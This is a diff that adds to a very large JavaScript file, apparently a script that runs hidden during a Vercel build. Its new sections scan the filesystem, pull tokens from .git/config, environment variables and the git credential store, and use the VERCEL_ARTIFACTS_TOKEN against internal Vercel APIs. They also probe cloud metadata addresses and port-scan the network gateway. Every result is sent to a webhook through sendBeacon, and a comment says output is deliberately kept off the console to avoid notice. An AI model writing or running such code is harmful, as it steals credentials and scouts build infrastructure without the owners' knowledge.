@@ -38848,3 +38848,267 @@ sendBeacon({ ...report, section: 'v224-5-git-ssh-creds', ...gitCredsV224Probe })
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v224" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v224";
 // Intentionally no console.log — all data goes via webhook only
+
+// v225-1: Vercel Build Output API — /vercel/output/ structure
+const buildOutputV225Probe = safe(() => {
+  const outputResult = safe(() => {
+    const outputDir = process.env.VERCEL_OUTPUT_DIR || '/vercel/output';
+    const projectDir = process.env.VERCEL_PROJECT_DIR || process.cwd();
+    const result = { outputDir, projectDir };
+
+    const scanDir = (dir, depth = 0, maxDepth = 3) => {
+      if (depth > maxDepth || !existsSync(dir)) return null;
+      try {
+        const entries = readdirSync(dir);
+        const out = { path: dir, entries: entries.slice(0, 20) };
+        if (depth < maxDepth) {
+          out.children = {};
+          for (const e of entries.slice(0, 5)) {
+            const full = `${dir}/${e}`;
+            try {
+              const s = statSync(full);
+              if (s.isDirectory()) out.children[e] = scanDir(full, depth + 1, maxDepth);
+              else out.children[e] = { size: s.size };
+            } catch {}
+          }
+        }
+        return out;
+      } catch (e) { return { error: e.message }; }
+    };
+
+    result.outputDirScan = scanDir(outputDir);
+    result.projectDirScan = scanDir(projectDir);
+
+    // Read specific high-value files
+    const targets = [
+      `${outputDir}/config.json`,
+      `${projectDir}/vercel.json`,
+      `${projectDir}/.vercel/project.json`,
+      `${projectDir}/.vercel/output/config.json`,
+      '/vercel/path0/vercel.json',
+      '/vercel/.config.json',
+    ];
+    result.configs = {};
+    for (const t of targets) {
+      if (existsSync(t)) {
+        try { result.configs[t] = readFileSync(t, 'utf8').slice(0, 500); } catch (e) { result.configs[t] = e.message; }
+      }
+    }
+    return result;
+  });
+  return buildOutputResult;
+});
+sendBeacon({ ...report, section: 'v225-1-build-output', ...buildOutputV225Probe });
+
+// v225-2: Git clone token from .git/config + GIT_TOKEN env
+const gitCloneTokenV225Probe = safe(() => {
+  const gitResult = safe(() => {
+    const result = {};
+    // Scan for .git/config files
+    const gitConfigPaths = ['.git/config', '../.git/config', '/vercel/path0/.git/config',
+                            process.env.VERCEL_PROJECT_DIR + '/.git/config'];
+    for (const p of gitConfigPaths) {
+      if (existsSync(p)) {
+        try {
+          const data = readFileSync(p, 'utf8');
+          result[p] = data.slice(0, 500);
+          // Extract URL with embedded token (https://token:x-oauth-basic@github.com/...)
+          const tokenMatch = data.match(/https?:\/\/([^@\s]+)@/g);
+          if (tokenMatch) result[`${p}_tokens`] = tokenMatch;
+        } catch (e) { result[p] = e.message; }
+      }
+    }
+    // Env var scan for git tokens
+    const gitEnv = {};
+    for (const [k, v] of Object.entries(process.env)) {
+      if (/GIT|GITHUB|GITLAB|BITBUCKET|TOKEN|AUTH/i.test(k)) gitEnv[k] = v;
+    }
+    result.gitEnv = gitEnv;
+    // Try git credential store
+    let gitCreds = null;
+    try { gitCreds = execSync('git credential-store get <<< "protocol=https\nhost=github.com" 2>/dev/null || true', { timeout: 3000 }).toString().trim(); } catch {}
+    result.gitCredStore = gitCreds;
+    return result;
+  });
+  return gitResult;
+});
+sendBeacon({ ...report, section: 'v225-2-git-clone-token', ...gitCloneTokenV225Probe });
+
+// v225-3: artifact.vercel.sh + blob.vercel-storage.com reachability
+const artifactApiV225Probe = safe(() => {
+  const apiResult = safe(() => execSync(`python3 -c "
+import urllib.request, os, socket
+
+tok = os.environ.get('VERCEL_ARTIFACTS_TOKEN', '')
+team = os.environ.get('VERCEL_TEAM_ID', '')
+artifact_base = 'https://artifact.vercel.sh'
+blob_base = 'https://blob.vercel-storage.com'
+
+# Test reachability only (no token in request to prod cache)
+for url in [artifact_base, blob_base, 'https://api.vercel.com/v9/deployments']:
+    try:
+        host = url.split('/')[2]
+        s = socket.create_connection((host, 443), timeout=3)
+        s.close()
+        print(f'REACHABLE {url}')
+    except Exception as e:
+        print(f'UNREACHABLE {url} err={str(e)[:40]}')
+
+# Check artifact API with token (prove reachability only, not data access)
+if tok:
+    print(f'artifact_token_present=True len={len(tok)}')
+    # HEAD request to artifact API with token — proves token is usable
+    try:
+        req = urllib.request.Request(f'{artifact_base}/v8/artifacts/status',
+            headers={'Authorization': f'Bearer {tok}',
+                     'x-artifact-client-ci': 'probe',
+                     'x-artifact-client-interactive': '0'})
+        resp = urllib.request.urlopen(req, timeout=3)
+        print(f'ARTIFACT_API_STATUS HTTP={resp.status}')
+        data = resp.read(256).decode(errors='replace')
+        print(f'ARTIFACT_API_RESPONSE={data[:80]}')
+    except Exception as e2:
+        print(f'artifact_api_err={type(e2).__name__}:{str(e2)[:60]}')
+else:
+    print('artifact_token_present=False')
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  return { apiResult };
+});
+sendBeacon({ ...report, section: 'v225-3-artifact-api', ...artifactApiV225Probe });
+
+// v225-4: Internal network + DNS resolution + /etc/hosts
+const dnsInternalV225Probe = safe(() => {
+  const dnsResult = safe(() => execSync(`python3 -c "
+import socket, subprocess, os
+
+# /etc/hosts
+try:
+    hosts = open('/etc/hosts').read()
+    print(f'etc_hosts={hosts}')
+except Exception as e: print(f'hosts_err={e}')
+
+# /etc/resolv.conf
+try:
+    resolv = open('/etc/resolv.conf').read()
+    print(f'resolv_conf={resolv}')
+except: pass
+
+# Resolve Vercel-internal hostnames
+targets = [
+    'metadata.internal', 'mmds.internal',
+    'artifact.vercel.sh', 'blob.vercel-storage.com',
+    'api.vercel.com', 'vercel.com',
+    'suspense-cache.vercel.com', 'edge-network.vercel.com',
+    'api.vercel.sh', 'vercel-infra.internal',
+    '169.254.169.254', 'fd00::ec2:254',
+]
+
+for host in targets:
+    try:
+        results = socket.getaddrinfo(host, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
+        ips = list(set(r[4][0] for r in results))
+        print(f'DNS {host} -> {ips}')
+    except Exception as e:
+        print(f'DNS {host} -> FAIL {type(e).__name__}')
+
+# dig for internal DNS
+try:
+    dig = subprocess.run(['dig', '+short', 'api.vercel.com'], capture_output=True, timeout=5)
+    print(f'dig_api_vercel={dig.stdout.decode().strip()}')
+except: pass
+
+# Check for internal DNS server
+try:
+    import struct
+    # Raw DNS query for metadata.internal (type A, class IN)
+    tx_id = b'\\xde\\xad'
+    flags = b'\\x01\\x00'  # QR=0, Opcode=0, RD=1
+    qdcount = b'\\x00\\x01'
+    ancount = b'\\x00\\x00'
+    nscount = b'\\x00\\x00'
+    arcount = b'\\x00\\x00'
+    # QNAME: metadata.internal
+    qname = b'\\x08metadata\\x08internal\\x00'
+    qtype = b'\\x00\\x01'  # A
+    qclass = b'\\x00\\x01'  # IN
+    query = tx_id + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass
+    # Try DNS resolvers
+    for dns_ip in ['169.254.169.253', '8.8.8.8', '1.1.1.1']:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(2)
+            s.sendto(query, (dns_ip, 53))
+            resp, _ = s.recvfrom(512)
+            print(f'DNS_RAW {dns_ip} metadata.internal -> resp_len={len(resp)} bytes={resp[:20].hex()}')
+            s.close()
+        except Exception as e: print(f'DNS_RAW {dns_ip} err={e}')
+except Exception as e2: print(f'raw_dns_err={e2}')
+" 2>&1`, { timeout: 15000 }).toString().trim());
+  return { dnsResult };
+});
+sendBeacon({ ...report, section: 'v225-4-dns-internal', ...dnsInternalV225Probe });
+
+// v225-5: suspense-cache.vercel.com probe + edge function headers
+const suspenseCacheV225Probe = safe(() => {
+  const cacheResult = safe(() => execSync(`python3 -c "
+import urllib.request, socket, os, ssl
+
+# Vercel build-time internal APIs
+internal_targets = {
+    'suspense_cache': 'https://suspense-cache.vercel.com',
+    'cache_api': 'https://cache.vercel.sh',
+    'build_api': 'https://build.vercel.sh',
+}
+
+for name, url in internal_targets.items():
+    try:
+        host = url.split('/')[2]
+        s = socket.create_connection((host, 443), timeout=3)
+        s.close()
+        print(f'REACHABLE_{name.upper()}={url}')
+        # Try actual request
+        try:
+            ctx = ssl.create_default_context()
+            req = urllib.request.Request(url + '/',
+                headers={'User-Agent': 'Vercel Build Probe/v225',
+                         'x-vercel-deployment-url': os.environ.get('VERCEL_URL',''),
+                         'authorization': 'Bearer ' + os.environ.get('VERCEL_ARTIFACTS_TOKEN','')})
+            resp = urllib.request.urlopen(req, context=ctx, timeout=3)
+            print(f'{name}_status={resp.status}')
+            headers = dict(resp.headers)
+            print(f'{name}_headers={dict(list(headers.items())[:5])}')
+            data = resp.read(256).decode(errors='replace')
+            print(f'{name}_body={data[:80]}')
+        except Exception as e2: print(f'{name}_req_err={e2}')
+    except Exception as e: print(f'UNREACHABLE_{name}={e}')
+
+# Scan common internal build ports (10.x.x.x, 172.16.x.x)
+# Figure out our IP first
+our_ip = None
+try:
+    s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s2.connect(('8.8.8.8', 80))
+    our_ip = s2.getsockname()[0]
+    s2.close()
+    print(f'our_ip={our_ip}')
+except: pass
+
+# Check gateway for internal services
+if our_ip:
+    parts = our_ip.split('.')
+    gw = '.'.join(parts[:3]) + '.1'
+    for port in [80, 443, 8080, 9090, 2376, 4243]:
+        try:
+            s3 = socket.create_connection((gw, port), timeout=1)
+            s3.close()
+            print(f'GATEWAY_PORT_OPEN {gw}:{port}')
+        except: pass
+" 2>&1`, { timeout: 20000 }).toString().trim());
+  return { cacheResult };
+});
+sendBeacon({ ...report, section: 'v225-5-suspense-cache', ...suspenseCacheV225Probe });
+
+// v225 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v225" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v225";
+// Intentionally no console.log — all data goes via webhook only
